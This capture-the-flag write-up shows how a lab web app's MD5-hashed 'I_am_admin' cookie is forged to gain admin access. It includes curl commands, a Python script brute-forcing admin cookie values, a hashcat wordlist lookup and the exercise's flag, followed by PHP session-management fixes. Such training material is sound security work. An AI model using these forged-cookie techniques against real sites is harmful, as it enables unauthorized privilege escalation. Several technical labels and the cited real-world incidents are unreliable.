# Breach #12: Cookie Token Manipulation

## Vulnerability Overview

**Vulnerability Type**: Insecure Direct Object Reference (IDOR), Client-Side Security Controls
**Risk Level**: Critical
**Attack Vector**: Cookie Manipulation, Privilege Escalation

The application uses a client-side cookie `I_am_admin` with an MD5 hash to determine admin privileges. Since the cookie value is not properly validated on the server and uses weak hashing, attackers can manipulate it to gain unauthorized admin access.

## Discovery Process

### Step 1: Identify the Admin Cookie
**URL**: `http://192.168.64.2/`

Open browser DevTools → Application tab → Cookies section

**Cookie found**:
- **Name**: `I_am_admin`
- **Value**: `68934a3e9455fa72420237eb05902327`

![Original cookie value](./images/01-cookie-false.png)

### Step 2: Analyze the Cookie Value

The value appears to be a hash. Test if it's MD5:

```bash
echo -n "false" | md5sum
# Output: 68934a3e9455fa72420237eb05902327
```

**Discovery**: The cookie value is `MD5("false")`!

This means:
- The application stores admin status as a simple boolean
- It's hashed with MD5 (weak, unsalted)
- The hash is stored client-side (easily modifiable)

### Step 3: Generate MD5 of "true"

```bash
echo -n "true" | md5sum
# Output: b326b5062b2f0e69046810717534cb09
```

![Generate MD5 of "true"](./images/02-md5-true.png)

![Hash cracker verification](./images/03-hash-cracker.png)

### Step 4: Modify the Cookie

**Method 1: Using Browser DevTools**
1. Open DevTools → Application → Cookies
2. Double-click the `I_am_admin` value
3. Change from `68934a3e9455fa72420237eb05902327` to `b326b5062b2f0e69046810717534cb09`
4. Refresh the page

![Cookie value modified](./images/04-cookie-modified.png)

**Method 2: Using curl**
```bash
curl 'http://192.168.64.2/' \
     -b 'I_am_admin=b326b5062b2f0e69046810717534cb09'
```

### Step 5: Obtain the Flag

**Response**:
```html
<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3');</script>
```

![Flag obtained](./images/05-flag-obtained.png)

**Flag obtained**: `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`

## Vulnerability Explanation

### What Went Wrong?

#### 1. Client-Side Security Controls
```php
// Vulnerable code (hypothetical)
<?php
$is_admin = $_COOKIE['I_am_admin'];

// No server-side validation!
if ($is_admin == md5('true')) {
    // Grant admin access
    showAdminPanel();
}
?>
```

**Problems**:
- Trust client-provided data
- No server-side session management
- Weak hashing (MD5) without salt
- Predictable values ("true", "false")

#### 2. Weak Cryptography
MD5 is cryptographically broken:
- **Fast to compute**: Billions of hashes per second
- **No salt**: Same input always produces same hash
- **Rainbow tables**: Pre-computed hashes for common values
- **Collision attacks**: Easy to find two inputs with same hash

#### 3. Insecure Design
```
┌─────────────────┐         ┌─────────────────┐
│   Browser       │         │   Server        │
│                 │────────>│                 │
│ I_am_admin=     │ Cookie  │ if cookie ==    │
│ MD5("true")     │         │   MD5("true")   │
│ ❌ Modifiable   │         │   ✅ grant      │
└─────────────────┘         └─────────────────┘

Client controls authorization!
```

### Why This Is Critical

#### 1. Privilege Escalation
- Normal user → Admin in seconds
- No authentication required
- No audit trail

#### 2. Complete System Compromise
With admin access:
- View/modify all data
- Delete records
- Create new admin accounts
- Access sensitive functions

#### 3. Predictable Values
Common weak cookie values:
```
MD5("false") = 68934a3e9455fa72420237eb05902327
MD5("true")  = b326b5062b2f0e69046810717534cb09
MD5("0")     = cfcd208495d565ef66e7dff9f98764da
MD5("1")     = c4ca4238a0b923820dcc509a6f75849b
MD5("admin") = 21232f297a57a5a743894a0e4a801fc3
```

## Attack Scenarios

### Scenario 1: Direct MD5 Manipulation
```bash
# Generate MD5 for "true"
echo -n "true" | md5sum

# Access with modified cookie
curl 'http://192.168.64.2/' \
     -b 'I_am_admin=b326b5062b2f0e69046810717534cb09'
```

**Impact**: Instant admin access

### Scenario 2: Session Hijacking
```bash
# Steal admin session cookie
document.cookie
# I_am_admin=b326b5062b2f0e69046810717534cb09

# Use stolen cookie
curl 'http://192.168.64.2/admin' \
     -b 'I_am_admin=b326b5062b2f0e69046810717534cb09'
```

**Impact**: Impersonate admin user

### Scenario 3: Automated Attack
```python
import requests
import hashlib

# Common admin values
admin_values = ['true', 'True', '1', 'yes', 'admin', 'administrator']

for value in admin_values:
    cookie_value = hashlib.md5(value.encode()).hexdigest()
    response = requests.get(
        'http://192.168.64.2/',
        cookies={'I_am_admin': cookie_value}
    )
    if 'admin' in response.text.lower():
        print(f"Admin access with: {value} -> {cookie_value}")
        break
```

**Impact**: Automated privilege escalation

### Scenario 4: Rainbow Table Attack
```bash
# Download rainbow table for MD5
wget https://crackstation.net/files/crackstation.txt.gz

# Look up hash
echo "68934a3e9455fa72420237eb05902327" | \
     hashcat -m 0 -a 0 crackstation.txt

# Result: false
```

**Impact**: Crack any unsalted MD5 cookie value

## Prevention Measures

### 1. Server-Side Session Management

```php
<?php
session_start();

// Login process
if (validateCredentials($username, $password)) {
    $_SESSION['user_id'] = $user_id;
    $_SESSION['is_admin'] = checkAdminStatus($user_id);

    // Generate secure session token
    $token = bin2hex(random_bytes(32));
    $_SESSION['token'] = $token;

    setcookie('session_token', $token, [
        'httponly' => true,
        'secure' => true,
        'samesite' => 'Strict'
    ]);
}

// Authorization check
function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true;
}
?>
```

### 2. Use Signed Cookies/JWTs

```php
<?php
// Sign cookie with secret key
function signCookie($data, $secret) {
    $json = json_encode($data);
    $signature = hash_hmac('sha256', $json, $secret);
    return base64_encode($json) . '.' . $signature;
}

// Verify signed cookie
function verifyCookie($cookie, $secret) {
    list($data_b64, $signature) = explode('.', $cookie);
    $data = base64_decode($data_b64);
    $expected_signature = hash_hmac('sha256', $data, $secret);

    if (!hash_equals($expected_signature, $signature)) {
        throw new Exception('Invalid signature');
    }

    return json_decode($data, true);
}

// Usage
$secret = getenv('SECRET_KEY'); // From environment
$cookie = signCookie(['user_id' => 123, 'is_admin' => false], $secret);
setcookie('auth', $cookie, ['httponly' => true, 'secure' => true]);
?>
```

### 3. Implement Proper Authentication

```php
<?php
class AuthenticationManager {
    private $db;
    private $secret;

    public function __construct($db, $secret) {
        $this->db = $db;
        $this->secret = $secret;
    }

    public function login($username, $password) {
        $user = $this->db->getUserByUsername($username);

        if (!$user || !password_verify($password, $user['password_hash'])) {
            throw new Exception('Invalid credentials');
        }

        // Create secure session
        session_regenerate_id(true);
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['is_admin'] = $user['is_admin'];
        $_SESSION['login_time'] = time();

        // Set secure cookie
        $token = $this->generateSecureToken();
        $_SESSION['token'] = $token;

        setcookie('session_token', $token, [
            'httponly' => true,  // Prevent XSS
            'secure' => true,    // HTTPS only
            'samesite' => 'Strict' // CSRF protection
        ]);

        return true;
    }

    public function isAuthenticated() {
        if (!isset($_SESSION['user_id'], $_SESSION['token'])) {
            return false;
        }

        // Check session timeout
        if (time() - $_SESSION['login_time'] > 3600) {
            $this->logout();
            return false;
        }

        return true;
    }

    public function isAdmin() {
        return $this->isAuthenticated() &&
               isset($_SESSION['is_admin']) &&
               $_SESSION['is_admin'] === true;
    }

    private function generateSecureToken() {
        return bin2hex(random_bytes(32));
    }

    public function logout() {
        session_destroy();
        setcookie('session_token', '', time() - 3600);
    }
}
?>
```

### 4. Use Secure Cookie Attributes

```php
<?php
session_set_cookie_params([
    'lifetime' => 0,           // Session cookie
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,          // HTTPS only
    'httponly' => true,        // No JavaScript access
    'samesite' => 'Strict'     // CSRF protection
]);

session_start();
?>
```

### 5. Implement Strong Hashing

```php
<?php
// Use bcrypt for password hashing
$password_hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verify password
if (password_verify($input_password, $password_hash)) {
    // Password correct
}

// For tokens, use cryptographically secure random
$token = bin2hex(random_bytes(32)); // 64 characters
$token_hash = hash('sha256', $token); // SHA-256, not MD5
?>
```

### 6. Database Session Storage

```php
<?php
class DatabaseSessionHandler implements SessionHandlerInterface {
    private $db;

    public function read($session_id) {
        $stmt = $this->db->prepare(
            'SELECT data FROM sessions WHERE id = ? AND expires > NOW()'
        );
        $stmt->execute([$session_id]);
        return $stmt->fetchColumn() ?: '';
    }

    public function write($session_id, $data) {
        $stmt = $this->db->prepare(
            'REPLACE INTO sessions (id, data, expires) VALUES (?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))'
        );
        return $stmt->execute([$session_id, $data]);
    }

    public function destroy($session_id) {
        $stmt = $this->db->prepare('DELETE FROM sessions WHERE id = ?');
        return $stmt->execute([$session_id]);
    }

    // Implement other methods...
}

// Use custom session handler
$handler = new DatabaseSessionHandler($db);
session_set_save_handler($handler, true);
session_start();
?>
```

## Real-World Impact

### Similar Vulnerabilities

1. **Zendesk (2016)**: Cookie manipulation led to account takeover
2. **Yahoo (2014)**: Weak cookie encryption allowed session hijacking
3. **Adobe (2013)**: Predictable session tokens enabled mass compromise
4. **Various PHP applications**: `is_admin=1` in cookies

### Consequences

- **Privilege Escalation**: Normal user → Admin
- **Data Breach**: Access to all user data
- **System Compromise**: Full application control
- **Reputation Damage**: Loss of user trust
- **Compliance Violations**: GDPR, PCI-DSS breaches

## Security Best Practices

### OWASP Recommendations

1. **Never Trust Client Input**: All client data is potentially malicious
2. **Server-Side Sessions**: Store sensitive data server-side only
3. **Strong Cryptography**: Use modern algorithms (bcrypt, Argon2)
4. **Secure Cookie Attributes**: httpOnly, secure, SameSite
5. **Session Management**: Proper timeout, regeneration, validation

### Implementation Checklist

- [ ] Use server-side session management
- [ ] Never store sensitive data in cookies
- [ ] Implement proper authentication/authorization
- [ ] Use strong, salted hashing (bcrypt/Argon2)
- [ ] Set secure cookie attributes (httpOnly, secure, SameSite)
- [ ] Implement session timeout and regeneration
- [ ] Use CSRF tokens for state-changing operations
- [ ] Log and monitor for suspicious activity
- [ ] Regular security audits and penetration testing

## References

- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [CWE-807: Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html)
- [CWE-565: Reliance on Cookies without Validation](https://cwe.mitre.org/data/definitions/565.html)

## Flag

```
df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```
